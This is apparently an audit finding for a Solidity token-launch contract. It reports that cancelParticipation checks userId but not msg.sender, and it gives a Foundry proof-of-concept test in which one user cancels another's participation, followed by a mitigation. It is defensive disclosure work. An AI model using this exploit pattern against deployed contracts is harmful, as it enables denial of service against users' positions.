# Unauthorized Cancellation of User Participations

## Finding description and impact

The `cancelParticipation` function fails to verify that the caller (msg.sender) matches the original participant's address, allowing any user to cancel another user's participation.

## Links to affected code

## Proof of Concept

The vulnerability lies in the authentication check of the function. While it verifies the `userId` matches, it fails to validate that `msg.sender` matches the original participant's address:

```solidity
// Only checks userId, not address
if (request.userId != info.userId) {
    revert UserIdMismatch(info.userId, request.userId);
}

// Later sends refund to original address
IERC20(info.currency).safeTransfer(info.userAddress, refundCurrencyAmount);
```

While the refund is correctly sent to the original participant's address (stored in `info.userAddress`), the lack of address validation means any user with knowledge of another user's participation details can force a cancellation of their position.

Add this test to `LaunchCancelParticipationTest` contract:

```solidity
    function testUnauthorizedCancelParticipation() public {
        // Setup launch group with non-finalizing participation
        bytes32 launchGroupId = bytes32(uint256(1));
        LaunchGroupSettings memory settings1 = _setupLaunchGroupWithStatus(launchGroupId, LaunchGroupStatus.PENDING);
        settings1.finalizesAtParticipation = false;
        settings1.status = LaunchGroupStatus.ACTIVE;

        vm.startPrank(manager);
        launch.setLaunchGroupSettings(launchGroupId, settings1);
        vm.stopPrank();

        // User1 makes initial participation with their own participation ID
        bytes32 participationId = bytes32("user1_participation");
        ParticipationRequest memory initialRequest = _createParticipationRequest();
        initialRequest.launchGroupId = launchGroupId;
        initialRequest.launchParticipationId = participationId;
        initialRequest.tokenAmount = 1000 * 10 ** launch.tokenDecimals();
        initialRequest.userAddress = user1; // Important: Set correct user address
        bytes memory initialSignature = _signRequest(abi.encode(initialRequest));

        vm.startPrank(user1);
        currency.approve(
            address(launch), _getCurrencyAmount(launchGroupId, initialRequest.currency, initialRequest.tokenAmount)
        );
        launch.participate(initialRequest, initialSignature);
        vm.stopPrank();

        // Record User1's initial currency balance
        uint256 user1InitialBalance = currency.balanceOf(user1);

        // User2 attempts to cancel User1's participation
        vm.startPrank(user2);
        CancelParticipationRequest memory cancelRequest = _createCancelParticipationRequest();
        cancelRequest.launchGroupId = launchGroupId;
        cancelRequest.launchParticipationId = participationId;
        cancelRequest.userId = initialRequest.userId; // Use User1's userId
        cancelRequest.userAddress = user2; // Use attacker's address

        bytes memory cancelSignature = _signRequest(abi.encode(cancelRequest));

        // This should succeed since the contract only checks userId, not address
        launch.cancelParticipation(cancelRequest, cancelSignature);
        vm.stopPrank();

        // Verify participation was cancelled
        ParticipationInfo memory info = launch.getParticipationInfo(participationId);
        assertEq(info.tokenAmount, 0);
        assertEq(info.currencyAmount, 0);

        // Verify User1 got their refund (not the attacker)
        assertGt(currency.balanceOf(user1), user1InitialBalance);
    }

```
## Impact
While the vulnerability enables:

  1. Forced cancellation of other users' positions
  2. Denial of service for specific users by repeatedly cancelling their participations

## Recommended mitigation steps

Add address validation at the start of the function:

```solidity
    // Add address validation
    if (msg.sender != info.userAddress) {
        revert UnauthorizedCancellation();
    }
```
